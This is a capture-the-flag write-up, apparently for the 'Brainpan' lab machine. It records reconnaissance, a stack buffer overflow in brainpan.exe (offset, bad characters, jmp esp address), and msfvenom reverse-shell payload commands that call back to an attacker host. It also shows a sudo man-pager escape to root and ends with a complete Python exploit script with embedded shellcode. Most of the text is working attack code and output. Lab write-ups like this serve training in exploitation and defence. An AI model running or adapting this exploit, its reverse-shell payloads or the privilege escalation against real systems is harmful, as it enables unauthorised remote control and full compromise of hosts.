## nmap -sVC -A 10.10.93.138
```bash
Nmap scan report for 10.10.93.138
Host is up (0.39s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
53/tcp    filtered domain
9999/tcp  open     abyss?
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open     http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.92%I=7%D=3/24%Time=623C7142%P=x86_64-pc-linux-gnu%r(NU
SF:LL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|
SF:\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\
SF:x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x
SF:20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
SF:20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|
SF:\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
SF:20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
SF:20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x
SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_
SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x
SF:20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x
SF:20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x
SF:20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=3/24%OT=9999%CT=1%CU=30266%PV=Y%DS=4%DC=T%G=Y%TM=623C7
OS:1C0%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=8)S
OS:EQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=Z%TS=8)OPS(O1=M508ST11NW7%O2=M508ST11NW7
OS:%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=45EA%W
OS:2=45EA%W3=45EA%W4=45EA%W5=45EA%W6=45EA)ECN(R=Y%DF=Y%T=40%W=4602%O=M508NN
OS:SNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y
OS:%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR
OS:%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40
OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G
OS:%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   225.67 ms 10.2.0.1
2   ... 3
4   367.89 ms 10.10.93.138

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 165.90 seconds

```

## Enumeration
### dirb http://10.10.93.138:10000
```bash
http://10.10.93.138:10000/bin
```
### download http://10.10.93.138:10000/bin/brainpan.exe

# Buffer Overflow
## Fuzzing
```
crashed with 700 bytes
```
## EIP Offset
### /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 700
```
EIP = 35724134
```
### /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134
```
[*] Exact match at offset 524
```
## Finding Bad Characters 
### !mona bytearray -b "\x00"
### !mona compare -f  "D:\_Tooooools\Immunity Debugger\bytearray.bin" -a 005FF910
```bash
 Message=!!! Hooray, normal shellcode unmodified !!!
```
## Jump Address
### !mona modules
```
Log data, item 17
 Address=0BADF00D
 Message= 0x31170000 | 0x31176000 | 0x00006000 | False  | False   | False |  False   | False  | -1.0- [brainpan.exe] (E:\_try hack me\_offensive pentesting\BOF EXE\brainpan.exe)
```
### !mona jmp -r esp -m "brainpan.exe"
```
Log data, item 3
 Address=311712F3
 Message=  0x311712f3 : jmp esp |  {PAGE_EXECUTE_READ} [brainpan.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (E:\_try hack me\_offensive pentesting\BOF EXE\brainpan.exe)
```

## Payload
### msfvenom -p windows/shell_reverse_tcp LHOST=10.2.92.176 LPORT=5555 -e x86/shikata_ga_nai -f py -v shell -b "\x00"

## Exploit

## new payload
### msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.2.92.176 LPORT=5555 -e x86/shikata_ga_nai -f py -v shell -b "\x00"

## pimp shell 
### python3 -c  'import pty;pty.spawn("/bin/bash")' 

## Privilege Escalation
### sudo -l
```bash
puck@brainpan:/home/puck$ sudo -l
sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
```
## sudo /home/anansi/bin/anansi_util
```bash
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
```
## sudo /home/anansi/bin/anansi_util manual man man 
```bash
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual man man
sudo /home/anansi/bin/anansi_util manual man man
No manual entry for manual
WARNING: terminal is not fully functional
-  (press RETURN)!/bin/sh
!/bin/sh
# whoami
whoami
root
```


## Exploit Code
```python
import socket
import sys
import os

#ip="127.0.0.1"
ip = "10.10.93.138"

port = 9999
pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A"

badChars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

shell =  b""
shell += b"\xdb\xc0\xba\x3e\x3d\xe3\x03\xd9\x74\x24\xf4\x5e"
shell += b"\x31\xc9\xb1\x12\x31\x56\x17\x83\xc6\x04\x03\x68"
shell += b"\x2e\x01\xf6\xa5\x8b\x32\x1a\x96\x68\xee\xb7\x1a"
shell += b"\xe6\xf1\xf8\x7c\x35\x71\x6b\xd9\x75\x4d\x41\x59"
shell += b"\x3c\xcb\xa0\x31\xb5\x29\x0f\x71\xa1\x2f\xaf\x64"
shell += b"\x81\xb9\x4e\x36\x83\xe9\xc1\x65\xff\x09\x6b\x68"
shell += b"\x32\x8d\x39\x02\xa3\xa1\xce\xba\x53\x91\x1f\x58"
shell += b"\xcd\x64\xbc\xce\x5e\xfe\xa2\x5e\x6b\xcd\xa5"

#311712f3
n=0
while True:
 try:
   print ("Sending ",n,"Bytes")
   
  # payload="A"*n 
   #payload= pattern
   #payload="A"*(524)+"BBBB"+"C"*(6300-6108-4)
   #payload="A"*(524)+"BBBB" + badChars+ "C"*(700-524-4-len(badChars))

   payload="A"*(524)+"\xf3\x12\x17\x31" +"\x90"*16 +shell + "\x90"*(700-524-4-16-len(shell))

   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((ip, port))
  
   s.send(payload)
   print (s.recv(1024))


   s.close()
   #break
   n+=100
   
 except Exception as e:
           print (e)
           print("crashed at, ",n)
           break

```
